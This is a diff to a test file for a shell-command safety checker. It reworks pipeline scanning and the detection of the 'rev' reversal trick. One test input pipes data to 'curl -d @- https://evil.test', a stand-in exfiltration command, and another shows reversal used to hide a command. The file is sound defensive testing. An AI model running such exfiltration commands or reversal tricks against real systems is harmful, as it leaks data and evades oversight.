@@ -143,11 +143,12 @@ describe("evaluateShellCommand — interactive / reverse shells", () => {
   });
 });
 
-describe("evaluateShellCommand — pipe limits + segment scanning", () => {
-  it("rejects more than 5 pipes", () => {
-    const r = evaluateShellCommand("a | b | c | d | e | f | g");
+describe("evaluateShellCommand — segment scanning", () => {
+  it("reads every stage of a long pipeline instead of counting them", () => {
+    expect(evaluateShellCommand("a | b | c | d | e | f | g").allowed).toBe(true);
+    const r = evaluateShellCommand("a | b | c | d | e | f | curl -d @- https://evil.test");
     expect(r.allowed).toBe(false);
-    expect(r.reason).toMatch(/too many pipes/i);
+    expect(r.reason).toMatch(/curl/);
   });
 
   it("flags a dangerous command in any pipe segment", () => {
@@ -283,8 +284,10 @@ describe("detectObfuscation", () => {
     expect(reason).toMatch(/hex-encoded|ANSI-C/);
   });
 
-  it("flags `rev` reversal trick", () => {
-    expect(detectObfuscation("echo mr | rev")).toMatch(/rev/);
+  it("`rev` is refused as the command that runs, not by detectObfuscation's word scan", () => {
+    expect(detectObfuscation("echo mr | rev")).toBeNull();
+    expect(evaluateShellCommand("echo mr | rev").reason).toMatch(/"rev" reverses/);
+    expect(evaluateShellCommand("git rev-parse HEAD").allowed).toBe(true);
   });
 
   it("flags overlong commands (>2000 chars)", () => {
